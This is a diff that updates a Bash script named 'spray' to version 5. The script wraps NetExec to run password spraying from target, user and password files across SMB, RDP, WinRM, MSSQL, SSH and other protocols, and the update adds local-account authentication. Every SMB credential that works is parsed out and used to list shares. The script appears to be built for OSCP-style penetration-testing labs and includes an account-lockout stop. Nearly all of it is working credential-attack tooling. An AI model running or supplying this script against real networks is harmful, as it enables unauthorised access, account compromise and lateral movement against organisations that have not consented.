@@ -119,57 +119,57 @@ sudo chmod +x /usr/local/bin/spray
 #!/bin/bash
 
 # ===============================
-# spray v4 - Stable & OSCP-safe NetExec Sprayer
+# spray v5 - Domain + Local Auth Support
 # ===============================
 
 TARGET_FILE=${1:-target}
 USER_FILE=${2:-user}
 PASS_FILE=${3:-pass}
+AUTH_MODE=${4:-domain}   # domain | local
 
 OUTDIR="spray_netexec"
 RAW_OUT="$OUTDIR/raw_spray.txt"
 CLEAN_OUT="$OUTDIR/clean_spray.txt"
 SMB_OUT="$OUTDIR/smb_spray.txt"
 
-# OSCP-safe config
 THREADS=1
-
 PROTOCOLS=("smb" "rdp" "wmi" "winrm" "mssql" "ssh" "ftp" "vnc" "nfs" "ldap")
 
 # ===============================
 # HELP
 # ===============================
 if [[ "$1" == "-h" || "$1" == "--help" ]]; then
-    echo "spray v4 - Hardened password spraying (NetExec)"
+    echo "spray v5 - Domain & Local auth supported"
     echo
     echo "Usage:"
-    echo "  spray [target] [user] [pass]"
+    echo "  spray [target] [user] [pass] [mode]"
     echo
-    echo "Default:"
-    echo "  spray (uses: target user pass)"
-    echo
-    echo "Output:"
-    echo "  spray_netexec/"
-    echo "    ├── raw_spray.txt"
-    echo "    ├── clean_spray.txt"
-    echo "    └── smb_spray.txt"
-    echo
-    echo "Safe mode:"
-    echo "  Threads : $THREADS"
+    echo "Mode:"
+    echo "  domain (default)"
+    echo "  local"
     exit 0
 fi
 
 # ===============================
-# CHECK DEPENDENCY
+# DEP CHECK
 # ===============================
 command -v nxc >/dev/null || { echo "[!] nxc not found"; exit 1; }
 
 # ===============================
-# CHECK FILE
+# FILE CHECK
 # ===============================
 for f in "$TARGET_FILE" "$USER_FILE" "$PASS_FILE"; do
     [ -f "$f" ] || { echo "[!] Missing file: $f"; exit 1; }
 done
+
+# ===============================
+# AUTH MODE
+# ===============================
+if [[ "$AUTH_MODE" == "local" ]]; then
+    AUTH_FLAG="--local-auth"
+else
+    AUTH_FLAG=""
+fi
 
 # ===============================
 # INIT OUTPUT
@@ -181,10 +181,10 @@ mkdir -p "$OUTDIR"
 
 TARGETS=$(tr '\n' ' ' < "$TARGET_FILE")
 
+echo "[+] Mode    : $AUTH_MODE"
 echo "[+] Targets : $TARGET_FILE"
 echo "[+] Users   : $USER_FILE"
 echo "[+] Password: $PASS_FILE"
-echo "[+] Output  : $OUTDIR"
 echo
 
 # ===============================
@@ -200,34 +200,30 @@ for proto in "${PROTOCOLS[@]}"; do
     nxc $proto $TARGETS \
         -u "$USER_FILE" \
         -p "$PASS_FILE" \
+        $AUTH_FLAG \
         --threads $THREADS \
         --continue-on-success \
         --no-progress 2>/dev/null | tee "$TMP_OUT"
 
-    # Save RAW
     cat "$TMP_OUT" >> "$RAW_OUT"
-
-    # Save SUCCESS ONLY
     grep -i "\[+\]" "$TMP_OUT" >> "$CLEAN_OUT"
 
-    # ===============================
-    # OPTIONAL: STOP IF LOCKOUT DETECTED
-    # ===============================
+    # Lockout protection
     if grep -q "STATUS_ACCOUNT_LOCKED_OUT" "$TMP_OUT"; then
-        echo "[!] Detected account lockout! Stopping spray..."
+        echo "[!] Lockout detected! Stopping..."
         rm -f "$TMP_OUT"
         exit 1
     fi
 
     # ===============================
-    # SMB AUTO ENUM (FIXED PARSING)
+    # SMB ENUM
     # ===============================
     if [[ "$proto" == "smb" ]]; then
         echo "[+] Checking valid SMB creds..."
+
         grep -i "\[+\]" "$TMP_OUT" | while read -r line; do
 
         IP=$(echo "$line" | awk '{print $2}')
-
         CREDS=$(echo "$line" | grep -oP '(?<=\[\+\] ).*')
 
         USER_PART=$(echo "$CREDS" | awk -F':' '{print $1}')
@@ -240,22 +236,23 @@ for proto in "${PROTOCOLS[@]}"; do
             DOMAIN=""
             USER="$USER_PART"
         fi
-        
+
         if [[ -z "$USER" || -z "$PASS" ]]; then
             echo "[!] Parse failed: $line"
             continue
-    fi
+        fi
 
-    echo "[+] SMB ENUM: $IP | $USER:$PASS"
+        echo "[+] SMB ENUM: $IP | $USER:$PASS"
 
-    if [[ -n "$DOMAIN" ]]; then
-        nxc smb "$IP" -u "$USER" -p "$PASS" -d "$DOMAIN" --shares --threads 1 --no-progress 2>/dev/null | tee -a "$SMB_OUT"
-    else
-        nxc smb "$IP" -u "$USER" -p "$PASS" --shares --threads 1 --no-progress 2>/dev/null | tee -a "$SMB_OUT"
-    fi
+        if [[ "$AUTH_MODE" == "local" ]]; then
+            nxc smb "$IP" -u "$USER" -p "$PASS" --local-auth --shares --threads 1 --no-progress 2>/dev/null | tee -a "$SMB_OUT"
+        elif [[ -n "$DOMAIN" ]]; then
+            nxc smb "$IP" -u "$USER" -p "$PASS" -d "$DOMAIN" --shares --threads 1 --no-progress 2>/dev/null | tee -a "$SMB_OUT"
+        else
+            nxc smb "$IP" -u "$USER" -p "$PASS" --shares --threads 1 --no-progress 2>/dev/null | tee -a "$SMB_OUT"
+        fi
 
-   done
-
+        done
     fi
 
     rm -f "$TMP_OUT"
